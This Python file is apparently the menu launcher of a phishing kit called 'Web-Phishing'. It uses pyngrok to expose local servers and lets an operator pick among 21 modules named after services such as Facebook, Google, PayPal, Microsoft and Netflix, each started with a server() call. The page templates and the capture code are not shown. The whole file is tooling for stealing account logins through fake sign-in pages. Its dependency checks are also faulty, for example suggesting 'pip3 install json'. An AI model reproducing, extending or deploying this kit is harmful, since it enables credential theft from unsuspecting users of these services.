from colorama import Fore 
from subprocess import Popen
import os
import sys
from pyngrok import ngrok 
import json
import time
from help import help
from module import adobe,badoo,devinart,facebook,github,google,instafollo,instagram,lichess,linkedin,microsoft,myspace,netflix,paypal,snapchat,steam,twitch,twitter,wordpress,yahoo,yandex


stat_file = 0
try:
    from colorama import Fore
except:
    os.system("clear")
    print(Fore.RED+"""\n Please Install colorama\n
    pip3 install colorama
        """)



try:
    from pyngrok import ngrok 
except:
    os.system("clear")
    print(Fore.RED+"""\n Please Install pyngrok\n
    python3 -m pip install pyngrok
        """)
try:
    from subprocess import Popen
except:
    os.system("clear")
    print(Fore.RED+"""\n Please Install Popen\n
    pip3 install Popen 
        """)



try:
    import json
except:
    os.system("clear")
    print(Fore.RED+"""\n Please Install json\n
    pip3 install json
        """)






while True:
    

    try:
        help.Banner()
        help.infolist1()
        number = input(Fore.RED+"Web-Phishing"+Fore.BLUE+"~"+Fore.WHITE+"/HOME"+Fore.WHITE+"""
""").lower()
    except:
        print("\n God Lock ... ")
        sys.exit()
    if number == '3':

        print()
        sys.exit()
            
        
       

    elif number == "2":
        help.infolist3()

        

    elif number == "":
        print(Fore.RED+" [!]"+Fore.BLUE+" Please Enter Number :))))")
        input("")



    elif number == '1':
        try:
            help.Banner()
            help.infolist2()
            infor = input(Fore.RED+"Web-Phishing"+Fore.BLUE+"~"+Fore.WHITE+"/HOME"+Fore.WHITE+"""
""").lower()
    
            if infor == "1":
                help.Banner()
                adobe.server()

                

            elif infor == "2":
                help.Banner()
                badoo.server()
                

               


            elif infor == "3":
                help.Banner()
                devinart.server()

            


            elif infor == "4":
                help.Banner()
                facebook.server()

                

            elif infor == "5":
                help.Banner()
                github.server()

               
            
            elif infor == "6":
                help.Banner()
                google.server()

                

            elif infor == "7":
                help.Banner()
                instafollo.server()

                #####################

            elif infor == "8":
                help.Banner()
                instagram.server()

                #####################

            elif infor == "9":
                help.Banner()
                lichess.server()   

                #####################

            elif infor == "10":
                help.Banner()
                linkedin.server()  
                #####################

            elif infor == "11":
                help.Banner()
                microsoft.server()
                #####################

            elif infor == "12":
                help.Banner()
                myspace.server()

                #####################
            elif infor == "13":
                help.Banner()
                netflix.server()

                #####################
            elif infor == "14":
                help.Banner()
                paypal.server()

                #####################
            elif infor == "15":
                help.Banner()
                snapchat.server()

                #####################
            elif infor == "16":
                help.Banner()
                steam.server()

                ##################### 
            elif infor == "17":
                help.Banner()
                twitch.server()

                #####################
            elif infor == "18":
                help.Banner()
                twitter.server()

                #####################
            elif infor == "19":
                help.Banner()
                wordpress.server()

                #####################
            elif infor == "20":
                help.Banner()
                yahoo.server()

                #####################
            elif infor == "21":
                help.Banner()
                yandex.server()

                #####################
            
            elif infor == "22":
                input(Fore.RED+" [!]"+Fore.GREEN+" Back To Menu (Press Enter...) ")
                help.infolist1()

                #####################
            elif infor == "23":
                sys.exit()
                
                #####################
            elif infor == "":
                input(Fore.RED+" [!]"+Fore.GREEN+" Please Enter Number (Press Enter...) ")
        except KeyboardInterrupt:
            print("")
            sys.exit()

#------------------------------------------------------------------------------------------------
   


